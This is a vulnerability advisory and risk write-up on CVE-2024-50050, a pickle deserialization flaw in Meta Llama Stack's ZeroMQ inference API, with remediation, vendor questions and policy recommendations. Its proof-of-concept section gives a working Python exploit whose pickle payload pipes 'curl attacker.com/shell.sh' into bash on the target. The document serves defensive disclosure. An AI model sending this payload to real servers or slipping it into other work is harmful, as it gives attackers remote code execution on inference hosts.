# CVE-2024-50050: Meta Llama Stack ZeroMQ Pickle Deserialization

## Quick Reference

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2024-50050 |
| **Framework** | Meta Llama Stack |
| **Affected Versions** | < 0.0.41 |
| **Fixed Version** | 0.0.41 |
| **CVSS Score** | 9.8 (Critical) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Attack Vector** | Network (ZeroMQ socket) |
| **Disclosed** | 2024-10-XX |

## Summary

Meta's Llama Stack reference Python inference API contained a critical vulnerability where it automatically deserialized objects from a ZeroMQ socket using pickle. A remote attacker could send malicious pickle objects to the socket and achieve remote code execution without authentication.

This vulnerability is notable because it affects Meta's official reference implementation for Llama model deployment, potentially impacting many production deployments.

## Technical Details

**Vulnerable Component:** ZeroMQ message handling in Llama Stack inference API

**Root Cause:** The inference API used pickle to serialize and deserialize messages sent over ZeroMQ sockets. This is a common but dangerous pattern - ZeroMQ provides message transport, but pickle provides no security guarantees for the message content.

**Attack Pattern:**
1. Attacker identifies a Llama Stack inference endpoint
2. Attacker connects to the ZeroMQ socket (often exposed on a network port)
3. Attacker sends a malicious pickle payload as a ZeroMQ message
4. Server automatically deserializes the payload using `pickle.load()`
5. Arbitrary code executes on the server

**Why This Is Critical:**
- No authentication required
- Network-accessible by design (inference endpoints are meant to receive requests)
- Affects Meta's official reference implementation
- Many organizations likely deployed without modification

## Proof of Concept

```python
import zmq
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# Connect to Llama Stack endpoint
context = zmq.Context()
socket = context.socket(zmq.REQ)
socket.connect("tcp://target-server:5555")

# Send malicious payload
payload = pickle.dumps(Exploit())
socket.send(payload)
# RCE occurs on server
```

## Remediation

### Immediate Actions

1. **Upgrade Llama Stack to 0.0.41 or later**
   ```bash
   pip install llama-stack>=0.0.41 --upgrade
   ```

2. **Network isolation** - Ensure Llama Stack endpoints are not exposed to untrusted networks

3. **Firewall rules** - Restrict access to ZeroMQ ports to known clients only

### Patch Details

Meta fixed this vulnerability by switching from pickle-based messaging to JSON-based messaging, which does not support arbitrary code execution.

## GRC Implications

### Risk Assessment

**Risk Level:** Critical

**Impact Scenarios:**
- Any internet-exposed Llama Stack deployment is immediately vulnerable
- Internal deployments are vulnerable to insider threats or lateral movement
- LLM-as-a-Service offerings built on Llama Stack are at risk
- Supply chain risk for applications integrating Llama Stack

### Vendor Assessment Questions

When evaluating vendors using Llama or Meta's AI infrastructure:

1. "Are you using Meta's Llama Stack for model serving?"
2. "What version of Llama Stack are you running?"
3. "How do you serialize messages in your inference pipeline?"
4. "What network controls exist around your LLM inference endpoints?"
5. "Have you reviewed Meta's security advisories for Llama Stack?"

### Unique Risk: Reference Implementation Amplification

When vulnerabilities exist in vendor-provided reference implementations, they tend to be widely replicated because:
- Developers copy reference code directly
- Tutorials and documentation reference the vulnerable patterns
- The vulnerability becomes a systemic issue rather than isolated

### Control Recommendations

| Control | Description | Priority |
|---------|-------------|----------|
| Version upgrade | Upgrade Llama Stack >= 0.0.41 | Critical |
| Network segmentation | Isolate LLM inference infrastructure | Critical |
| Authentication | Implement authentication for inference endpoints | High |
| Message format | Audit all inter-service communication for pickle usage | High |
| Monitoring | Alert on unexpected connections to inference endpoints | Medium |

### Policy Implications

This CVE highlights the need for security review of LLM deployment infrastructure, not just the models themselves. Consider adding to security policies:

- "LLM inference endpoints must not be directly exposed to untrusted networks"
- "Inter-service communication must use safe serialization formats (JSON, protobuf), not pickle"
- "Reference implementations from AI vendors must undergo security review before production deployment"

## References

- [BlueRock Security Analysis](https://www.bluerock.io/post/bluerock-in-action-neutralizing-deserialization-attacks-against-ai-ml-workloads)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-50050)
- [Llama Stack GitHub](https://github.com/meta-llama/llama-stack)

## Timeline

| Date | Event |
|------|-------|
| 2024-10-XX | Vulnerability discovered |
| 2024-10-XX | Meta notified |
| 2024-10-XX | Llama Stack 0.0.41 released with JSON-based messaging |
| 2024-10-XX | Public disclosure |

## Related Vulnerabilities

- General pickle-over-network anti-pattern
- [CVE-2025-32434](CVE-2025-32434.md) - PyTorch torch.load (related deserialization risk)

---

*Last updated: 2026-01-18*

*Tags: `meta` `llama` `llama-stack` `zeromq` `critical` `rce` `network` `inference`*
